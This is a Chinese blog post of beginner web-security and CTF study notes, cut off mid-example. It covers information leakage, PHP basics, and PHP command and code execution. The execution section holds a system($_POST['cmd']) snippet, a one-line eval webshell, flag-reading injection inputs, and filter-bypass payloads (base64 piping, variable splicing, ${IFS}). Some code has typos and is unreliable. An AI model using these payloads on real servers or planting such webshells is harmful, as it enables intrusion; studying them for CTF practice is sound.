<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>web入门学习 | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习WEB WEB最重要的技能是信息收集： 不止简单的网站探测，我们进行的每一步都要作为信息累积下来。因为你面对每一个网站时都是未知的，这也是为什么大部分资料都是线介绍信息搜集的原因吧。 信息泄露漏洞利用 http头信息泄露 &amp;#x2F;admin&amp;#x2F;和&amp;#x2F;admin区别 &amp;#x2F;admin&amp;#x2F;表示访问的是admin目录"><link rel="shortcut icon" href="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg"><link rel="canonical" href="https://jinmu1108.github.io/Web/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0WEB/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'web入门学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-18 10:29:45'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">web入门学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-12T04:57:58.000Z" title="发表于 2022-10-12 12:57:58">2022-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-18T02:29:45.672Z" title="更新于 2023-03-18 10:29:45">2023-03-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">web入门学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="web入门学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>学习WEB</h1>
<p>WEB最重要的技能是信息收集：</p>
<p>不止简单的网站探测，我们进行的每一步都要作为信息累积下来。因为你面对每一个网站时都是未知的，这也是为什么大部分资料都是线介绍信息搜集的原因吧。</p>
<h1>信息泄露漏洞利用</h1>
<h2 id="http头信息泄露">http头信息泄露</h2>
<h3 id="admin-和-admin区别">/admin/和/admin区别</h3>
<p>/admin/表示访问的是admin目录，会默认访问admin目录里面的索引文件，比如index.html或者index.php</p>
<p>/admin表示访问admin文件，如果没有这个文件，就直接返回404，不会去寻找索引文件</p>
<h2 id="报错信息泄露">报错信息泄露</h2>
<p>可以判断是什么系统，服务器</p>
<h2 id="页面信息泄露">页面信息泄露</h2>
<h2 id="robots-txt敏感信息泄露">robots.txt敏感信息泄露</h2>
<p>防君子不防小人</p>
<p>robots.txt可能会造成信息或路径泄露</p>
<p>有些网站没有robots.txt</p>
<p>robots.txt内容不一定是真实的，也有可能是对方在钓鱼</p>
<h2 id="git文件泄露">git文件泄露</h2>
<p>git是一个版本控制系统</p>
<h1>php基础知识</h1>
<h2 id="php的基本概念">php的基本概念</h2>
<p>php是一种网站的脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发</p>
<h2 id="php基础语法">php基础语法</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;helll&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="GET">_GET</h2>
<p>键(参数名) =值对(参数值)</p>
<p>a                =         b</p>
<p>？区分文件和参数部分</p>
<p>参数部分用&amp;区分多个<strong>键值对</strong></p>
<p>单个键值对 用=分割出  键值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<h2 id="POST">_POST</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="函数">函数</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">add</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="危险函数">危险函数</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用POST发送cmd=calc</p>
<p>会打开计算器</p>
<h1>php命令执行</h1>
<h2 id="命令执行RCE">命令执行RCE</h2>
<p>一般指目标服务器上的命令执行</p>
<h2 id="php的cmmand-exec函数">php的cmmand exec函数</h2>
<p>PHP官方由下面六种函数可以执行系统命令</p>
<ul>
<li>system</li>
<li>passthru</li>
<li>exec</li>
<li>shell_exec</li>
<li><strong>popen</strong></li>
<li><strong>pcntl_exec4</strong></li>
<li>执行运算符</li>
</ul>
<h2 id="php的命令执行和运用">php的命令执行和运用</h2>
<p>dir=./查看当前目录</p>
<p>dir=…/上级目录</p>
<p>dir=/根目录</p>
<p>dir=cat /flag读文件</p>
<p>dir=；tac flag.php可以反着读文件</p>
<p>dir=;cat /flag.php	F12看源码</p>
<p>在linux下所有东西都是基于文件的</p>
<p>/dev/null空设备</p>
<p>》/dev/null将输出转换到空设备，不让回显</p>
<p>cmd=tac flag.php</p>
<p>cmd=tac*/</p>
<p>cmd=ls;可以看当前目录</p>
<p>cmd=ls;tac flag.php&amp;&amp;;ls</p>
<p>shell的<code>分号;</code>可以用来分割命令</p>
<p>并列命令的&amp;&amp;的url编码（%26%26）可分割两条命令&amp;&amp;第一个成功下面才能执行下一个</p>
<p><code>;</code>则不管成功与否，两个命令作为两行来执行</p>
<h2 id="黑名单过滤">黑名单过滤</h2>
<h3 id="双写绕过">双写绕过</h3>
<h4 id="QQ图片20220928233229"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220928233229.png" alt="QQ图片20220928233229"></h4>
<h3 id="特定字符过滤flag的情况">特定字符过滤flag的情况</h3>
<h3 id="通配符">*通配符</h3>
<p>my*/会出现与my有关的文件</p>
<h3 id="占位符">?占位符</h3>
<p>代替一个</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220928233930.png" alt="QQ图片20220928233930"></p>
<p>||表示</p>
<ul>
<li>
<p>或</p>
</li>
<li>
<p>分割两条命令</p>
</li>
</ul>
<p>图中过滤flag  ；</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220928235637.png" alt="QQ图片20220928235637"></p>
<p>=ls ;/cat /f*</p>
<p>！如果不是这种情况</p>
<p>preg_match正则表达式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(o);<span class="comment">//不显示报错</span></span><br><span class="line"><span class="title function_ invoke__">highlignt_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮显示</span></span><br></pre></td></tr></table></figure>
<p>|\cat|\tac过滤cat tac</p>
<p>这时可以使用正则，其他未被过滤的指令，base编码解码1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="keyword">echo</span> dGFjIGZsYWcucGhw)|base64-d`</span><br></pre></td></tr></table></figure>
<h3 id="过滤cat-more等文件读取命令的情况；直接">过滤cat,more等文件读取命令的情况；直接</h3>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929000647.png" alt=""></p>
<p>``echo bHMK</p>
<p>或tac flag.php(换位编码后dGFjIGZsYWcucGhw)|base64-d`||</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="keyword">echo</span> dGFjIGZsYWcucGhw | base64 -d`</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929000647.png" alt="QQ图片20220929000647"></p>
<h3 id="变量拼接绕过关键字QQ图片20220929002843">变量拼接绕过关键字<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929002843.png" alt="QQ图片20220929002843"></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`a=c;b=at;c=fla;d=g.php;$a$b$&#123;c&#125;$&#123;d&#125;`</span><br></pre></td></tr></table></figure>
<h3 id="符号过滤可以爆破一下">符号过滤可以爆破一下</h3>
<p>读取文件时&lt;&gt;代替空格</p>
<p>${IFS}}</p>
<p>控制字符代替空格</p>
<p><code>%09 %0b %0c</code></p>
<p>字符串截取空格</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929004113.png" alt="QQ图片20220929003644"></p>
<p>？？</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221006213134810.png" alt="image-20221006213134810"></p>
<h3 id="过滤字母数字">过滤字母数字</h3>
<p>语言参考-预定义变量DOLGET?</p>
<p>只能<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929004217.png" alt="QQ图片20220929004217">用符号了</p>
<p>爆破规则0-127最大最小间隔2</p>
<h2 id="cmd-env">cmd=env</h2>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221006211243031.png" alt="image-20221006211243031"></p>
<p>看他的空格在哪截，在VSC打开（只是看看他在哪一位，截取的哪一行不能有被过滤的关键字）<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221006211609233.png" alt="image-20221006211609233"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221006211355991.png" alt="image-20221006211355991"></p>
<p>在x开始拿y个即 x（截出来的）:y（源代码中全部的） 在这里要让他是空格</p>
<p>cmd=tac${GPG_KEYS=:40:1}/<em>空格</em>/*</p>
<h1>3php的代码执行</h1>
<p>script短标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt; </span><br></pre></td></tr></table></figure>
<h2 id="什么是php的代码执行">什么是php的代码执行</h2>
<p>eval(&quot;要执行的php代码)；可以赢执行参数给的php代码</p>
<p>可以用?&gt;结束php代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo();hrllo world&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="代码执行和命令执行的区别">代码执行和命令执行的区别</h2>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720220929135711.png" alt="QQ图片20220929135711"></p>
<h2 id="php的代码执行是什么格式">php的代码执行是什么格式</h2>
<h3 id="在php语言中分为三种">在php语言中分为三种</h3>
<h4 id="函数调用">函数调用</h4>
<p>特征：（函数名字，函数参数，返回值）</p>
<p>函数名		                 (函数参数1；函数参数2，…)    分号</p>
<p>erro_reporting 	 	(	0 	                               	)       ;</p>
<h4 id="类方法调用">类方法调用</h4>
<p>特征：（类实例，方法名，方法参数，返回值）</p>
<p>假设我们有个ctfshow类的实例cs，里面有个方法go，那么调用格式为</p>
<p>类实例  箭头  类方法  （方法参数）分号</p>
<p>​    cs        -&gt;       go         (“dust22”)    ;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="语言结构调用">语言结构调用</h4>
<p>public  +方法         公开模板</p>
<p>private + 方法           私模板</p>
<p>它在内部可以访问类属性，在外部不能访问</p>
<p>类实例  箭头  类方法  （方法参数）分号</p>
<p>​    cs        -&gt;       go         (“dust22”)    ;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>//设置一个类，即<span class="title">test</span>，张三就是一个类实例</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;<span class="comment">//公有方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;<span class="comment">//私有方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$zhangsan</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$zhangsan</span> -&gt;name=<span class="string">&quot;张三&quot;</span>;   <span class="comment">//引用它的属性（name）</span></span><br><span class="line">    <span class="variable">$zhangsan</span> -&gt;age=<span class="string">&quot;18&quot;</span>;       <span class="comment">//</span></span><br><span class="line">   	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221003124121099.png" alt="image-20221003124121099"></p>
<p>不能直接访问私有属性（在外部无法访问）</p>
<p>那么怎么才能访问呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;    <span class="comment">//私有属性外部不能打开</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetAge</span>(<span class="params"><span class="variable">$a</span><span class="comment">/*给它一个参数a*/</span></span>)</span>&#123;       <span class="comment">//设置一个公有方法</span></span><br><span class="line">        <span class="variable language_">$this</span><span class="comment">/*指代当前对象*/</span>-&gt;age=<span class="variable">$a</span>;  <span class="comment">//初始化年龄就可以调用它的年龄了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span><span class="comment">/*不带括号*/</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    <span class="comment">/*如果在一个函数中调用return语句，将立即结束此函数的执行并将它的</span></span><br><span class="line"><span class="comment">    参数作为函数的值返回。也会终止eval()语句或者脚本文件的执行*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$zhangsan</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;name=<span class="string">&quot;张三&quot;</span>;   <span class="comment">//引用它的属性（name）</span></span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;<span class="title function_ invoke__">SetAge</span>(<span class="number">18</span>);      <span class="comment">//调用他的年龄</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$zhangsan</span>-&gt;<span class="title function_ invoke__">getAge</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221003125743884.png" alt="image-20221003125743884"></p>
<p>这时可以返回18，因为对age进行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;    <span class="comment">//私有属性外部不能打开</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetAge</span>(<span class="params"><span class="variable">$a</span><span class="comment">/*给它一个参数a*/</span></span>)</span>&#123;       <span class="comment">//设置一个公有方法</span></span><br><span class="line">        <span class="variable language_">$this</span><span class="comment">/*指代当前对象*/</span>-&gt;age=<span class="variable">$a</span>;  <span class="comment">//初始化年龄就可以调用它的年龄了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span><span class="comment">/*不带括号*/</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    <span class="comment">/*如果在一个函数中调用return语句，将立即结束此函数的执行并将它的</span></span><br><span class="line"><span class="comment">    参数作为函数的值返回。也会终止eval()语句或者脚本文件的执行*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 